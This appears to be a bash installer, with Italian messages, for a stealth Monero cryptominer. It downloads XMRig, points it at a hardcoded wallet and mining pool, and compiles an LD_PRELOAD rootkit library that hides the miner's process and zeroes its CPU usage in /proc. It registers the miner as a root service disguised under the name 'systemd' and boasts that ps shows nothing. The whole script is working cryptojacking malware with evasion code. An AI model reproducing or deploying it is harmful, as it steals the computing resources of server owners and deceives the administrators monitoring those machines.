#!/bin/bash

WALLET="46PY3me35srRYMUScA3r7uhNJorsH95Sg4rkCqYhKm7tFh94w5nSEnp91S7ZmLwFGJS9UrHN4BCxL7CcPDjGUj8cVFbgHkt"
POOL="gulf.moneroocean.stream:10128"

WORKER_NAME="server_$(hostname -s)"
CPU_USAGE=100

set -e

if [ "$EUID" -ne 0 ]; then
  echo "Errore: Esegui come root (sudo)"
  exit 1
fi

echo "=================================================="
echo "     Installazione VM SAFE + HIDER CPU + XMR FISSO"
echo "=================================================="

apt update && apt install -y wget tar curl git build-essential

mkdir -p /opt/systemd
cd /opt/systemd

# Scarica XMRig
if [ ! -f "xmrig" ]; then
    wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
    tar -xvf xmrig-6.26.0-linux-static-x64.tar.gz --strip-components=1
    rm xmrig-6.26.0-linux-static-x64.tar.gz
    chmod +x xmrig
fi

# Crea libprocesshider esteso con nascondi CPU
cat <<'EOF' > /opt/systemd/processhider.c
#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define PROCESS_NAME "xmrig"

static pid_t get_pid_from_path(const char *path) {
    if (strncmp(path, "/proc/", 6) != 0) return 0;
    const char *p = path + 6;
    pid_t pid = 0;
    while (*p >= '0' && *p <= '9') {
        pid = pid * 10 + (*p - '0');
        p++;
    }
    return pid;
}

static int is_target_process(pid_t pid) {
    if (pid <= 0) return 0;
    char path[256], buf[256];
    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    if (fgets(buf, sizeof(buf), f)) {
        size_t len = strlen(buf);
        if (len > 0 && buf[len-1] == '\n') buf[len-1] = '\0';
        fclose(f);
        return strcmp(buf, PROCESS_NAME) == 0;
    }
    fclose(f);
    return 0;
}

struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*original_readdir)(DIR *) = NULL;
    if (!original_readdir) original_readdir = dlsym(RTLD_NEXT, "readdir");
    
    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9') {
            pid_t pid = atoi(entry->d_name);
            if (is_target_process(pid)) continue;
        }
        return entry;
    }
    return NULL;
}

ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*original_read)(int, void *, size_t) = NULL;
    if (!original_read) original_read = dlsym(RTLD_NEXT, "read");
    
    char path[256] = {0};
    char fdpath[64];
    snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", fd);
    ssize_t len = readlink(fdpath, path, sizeof(path)-1);
    if (len > 0) path[len] = '\0';
    
    pid_t pid = get_pid_from_path(path);
    if (pid > 0 && is_target_process(pid) && strstr(path, "/stat")) {
        char realbuf[4096];
        ssize_t ret = original_read(fd, realbuf, count < sizeof(realbuf) ? count : sizeof(realbuf));
        if (ret > 0) {
            char *p = strchr(realbuf, ')');
            if (p) {
                p += 2;
                int field = 0;
                char *fields[50] = {0};
                char *token = strtok(p, " ");
                while (token && field < 50) {
                    fields[field++] = token;
                    token = strtok(NULL, " ");
                }
                if (field > 14) {
                    strcpy(fields[12], "0");
                    strcpy(fields[13], "0");
                }
                snprintf(buf, count, "%s", realbuf);
                return strlen(realbuf) + 1;
            }
        }
    }
    
    return original_read(fd, buf, count);
}
EOF

# Compila libprocesshider
cd /opt/systemd
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
cp libprocesshider.so /usr/local/lib/
ldconfig

# Configura hugepages
sysctl -w vm.nr_hugepages=2048
if ! grep -q "vm.nr_hugepages" /etc/sysctl.conf; then
    echo "vm.nr_hugepages=2048" >> /etc/sysctl.conf
fi

# MSR
if command -v wrmsr &> /dev/null || apt install -y msr-tools; then
    modprobe msr 2>/dev/null || true
    wrmsr -a 0x1a4 0xf 2>/dev/null || true
fi

# Crea servizio systemd con LD_PRELOAD e --coin monero
cat <<EOF > /etc/systemd/system/systemd.service
[Unit]
Description=Systemd Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/systemd

Environment="LD_PRELOAD=/usr/local/lib/libprocesshider.so"

ExecStart=/opt/systemd/xmrig \\
    -o $POOL \\
    -u $WALLET \\
    -p $WORKER_NAME \\
    --coin monero \\
    --keepalive \\
    --cpu-max-threads-hint=$CPU_USAGE \\
    --randomx-mode=fast \\
    --randomx-1gb-pages \\
    --no-nvml \\
    --no-opencl

Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now systemd.service

echo "=================================================="
echo "Installazione completata - XMR FISSO + HIDER"
echo "=================================================="
echo "Cartella: /opt/systemd"
echo "Servizio: systemd.service"
echo "Pool: $POOL"
echo "Coin: Monero (rx/0) fisso"
echo "Hider: /usr/local/lib/libprocesshider.so"
echo ""
echo "Comandi utili:"
echo "  Stato:      sudo systemctl status systemd"
echo "  Log:        sudo journalctl -u systemd -f"
echo "  Riavvio:    sudo systemctl restart systemd"
echo "  Stop:       sudo systemctl stop systemd"
echo "  Verifica:   ps aux | grep xmrig  (vuoto)"
echo "  Algo:       journalctl -u systemd -f | grep algo"
echo ""
echo "Worker: $WORKER_NAME"
echo "=================================================="
